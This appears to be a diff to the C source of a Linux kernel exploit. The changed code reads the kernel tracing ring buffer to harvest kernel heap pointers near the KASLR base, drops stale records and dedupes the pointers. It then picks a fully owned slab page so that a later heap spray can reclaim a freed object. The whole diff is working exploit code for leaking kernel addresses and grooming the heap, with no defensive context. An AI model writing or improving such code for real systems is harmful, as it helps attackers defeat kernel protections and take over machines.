@@ -22,11 +22,15 @@ static struct {
   uint32_t old_tracing;
   uint32_t old_buffer;
   pid_t tid;
+  uintptr_t site;
+  int ignore;
   size_t count;
+  size_t loose_count;
   unsigned int records;
 } tracefs_mm_state;
 
 static uintptr_t tracefs_mm_ptrs[TRACEFS_MM_MAX_PTRS];
+static uintptr_t tracefs_mm_loose[TRACEFS_MM_MAX_PTRS];
 
 static int tracefs_mm_write(const char *path, const char *value) {
   int fd = open(path, O_WRONLY | O_CLOEXEC);
@@ -128,22 +132,38 @@ static void tracefs_mm_scan_page(const unsigned char *page, size_t length) {
       break;
     }
     tracefs_mm_state.records++;
+    if (tracefs_mm_state.ignore) {
+      pos += total;
+      continue;
+    }
 
     const unsigned char *entry = page + record;
     int pid = 0;
     memcpy(&pid, entry + 4, sizeof(pid));
     const unsigned char *payload = entry + 8;
     size_t payload_len = record_len >= 8 ? record_len - 8 : 0;
-    if (pid == (int)tracefs_mm_state.tid && payload_len >= 32 &&
-        tracefs_mm_state.count < TRACEFS_MM_MAX_PTRS) {
+    if (pid == (int)tracefs_mm_state.tid && payload_len >= 32) {
       uint64_t site = 0, pointer = 0, allocated = 0;
       memcpy(&site, payload, sizeof(site));
       memcpy(&pointer, payload + 8, sizeof(pointer));
       memcpy(&allocated, payload + 24, sizeof(allocated));
-      if ((site & 0xffffULL) == (SLIDE_TRACEFS_MM_SITE_OFF & 0xffffULL) &&
-          allocated == SLIDE_TRACEFS_MM_OBJECT &&
-          (pointer >> 48) == 0xffffULL) {
-        tracefs_mm_ptrs[tracefs_mm_state.count++] = (uintptr_t)pointer;
+      if (allocated == SLIDE_TRACEFS_MM_OBJECT &&
+          (pointer >> 48) == 0xffffULL &&
+          (site & 0xffffULL) == (SLIDE_TRACEFS_MM_SITE_OFF & 0xffffULL)) {
+        int seen = 0;
+        for (size_t k = 0; k < tracefs_mm_state.count; k++) {
+          if (tracefs_mm_ptrs[k] == (uintptr_t)pointer) {
+            seen = 1;
+            break;
+          }
+        }
+        if (site == tracefs_mm_state.site && !seen &&
+            tracefs_mm_state.count < TRACEFS_MM_MAX_PTRS) {
+          tracefs_mm_ptrs[tracefs_mm_state.count++] = (uintptr_t)pointer;
+        } else if (tracefs_mm_state.loose_count < TRACEFS_MM_MAX_PTRS) {
+          tracefs_mm_loose[tracefs_mm_state.loose_count++] =
+              (uintptr_t)pointer;
+        }
       }
     }
     pos += total;
@@ -193,6 +213,8 @@ static int tracefs_mm_start(void) {
   char text[16];
 
   memset(&tracefs_mm_state, 0, sizeof(tracefs_mm_state));
+  tracefs_mm_state.site =
+      kaslr_base ? (uintptr_t)(kaslr_base + SLIDE_TRACEFS_MM_SITE_OFF) : 0;
   snprintf(tracing_path, sizeof(tracing_path), "/sys/kernel/tracing/tracing_on");
   snprintf(buffer_path, sizeof(buffer_path),
            "/sys/kernel/tracing/buffer_size_kb");
@@ -245,6 +267,15 @@ static void tracefs_mm_stop(void) {
   tracefs_mm_state.armed = 0;
 }
 
+/* Drop records left over from an earlier process before the real window. */
+static void tracefs_mm_baseline(void) {
+  tracefs_mm_state.ignore = 1;
+  tracefs_mm_drain();
+  tracefs_mm_state.ignore = 0;
+  tracefs_mm_state.count = 0;
+  tracefs_mm_state.loose_count = 0;
+}
+
 static int tracefs_mm_available(void) {
   int armed = tracefs_mm_start();
   tracefs_mm_stop();
@@ -279,31 +310,50 @@ static int tracefs_mm_finish(uintptr_t *leaked, size_t pick, size_t min_index,
   uintptr_t best = 0;
   size_t best_objects = 0;
   size_t best_index = 0;
-  if (pick < tracefs_mm_state.count) {
-    uintptr_t base = tracefs_mm_ptrs[pick] & ~(TRACEFS_MM_SLAB_SIZE - 1);
-    for (size_t j = 0; j < tracefs_mm_state.count; j++) {
-      if ((tracefs_mm_ptrs[j] & ~(TRACEFS_MM_SLAB_SIZE - 1)) == base) {
-        best_objects++;
+  const uintptr_t *list = tracefs_mm_ptrs;
+  size_t list_count = tracefs_mm_state.count;
+  if (pick >= list_count) {
+    list = tracefs_mm_loose;
+    list_count = tracefs_mm_state.loose_count;
+  }
+  const size_t per_slab = TRACEFS_MM_SLAB_SIZE / SLIDE_TRACEFS_MM_OBJECT;
+  uintptr_t held_page = pick < list_count
+                            ? list[pick] & ~(TRACEFS_MM_SLAB_SIZE - 1)
+                            : 0;
+  /* The leak child's page frees right before the spray, so prefer it and keep
+     any other fully owned page as the fallback. */
+  for (int pass = 0; pass < 2 && !best; pass++)
+  for (size_t i = 0; i < list_count && !best; i++) {
+    uintptr_t base = list[i] & ~(TRACEFS_MM_SLAB_SIZE - 1);
+    if ((pass == 0) != (base == held_page)) {
+      continue;
+    }
+    size_t objects = 0;
+    for (size_t j = 0; j < list_count; j++) {
+      if ((list[j] & ~(TRACEFS_MM_SLAB_SIZE - 1)) == base) {
+        objects++;
       }
     }
-    /* The leak child's page is freed last, so reclaim picks it first. */
-    for (size_t j = 0; j < tracefs_mm_state.count; j++) {
-      if ((tracefs_mm_ptrs[j] & ~(TRACEFS_MM_SLAB_SIZE - 1)) != base) {
+    if (objects != per_slab) {
+      continue;
+    }
+    for (size_t j = 0; j < list_count; j++) {
+      if ((list[j] & ~(TRACEFS_MM_SLAB_SIZE - 1)) != base) {
         continue;
       }
-      size_t index = (size_t)((tracefs_mm_ptrs[j] - base) /
-                              SLIDE_TRACEFS_MM_OBJECT);
+      size_t index = (size_t)((list[j] - base) / SLIDE_TRACEFS_MM_OBJECT);
       if (index < min_index || index > max_index) {
         continue;
       }
-      best = tracefs_mm_ptrs[j];
+      best = list[j];
+      best_objects = objects;
       best_index = index;
       break;
     }
   }
   pr_info("mm trace leak found=%d objects=%zu index=%zu leaked=%016zx "
-          "pick=%zu hits=%zu records=%u\n", best != 0, best_objects,
-          best_index, best, pick, tracefs_mm_state.count,
+          "pick=%zu hits=%zu loose=%zu records=%u\n", best != 0, best_objects,
+          best_index, best, pick, list_count, tracefs_mm_state.loose_count,
           tracefs_mm_state.records);
   tracefs_mm_stop();
   if (!best) {
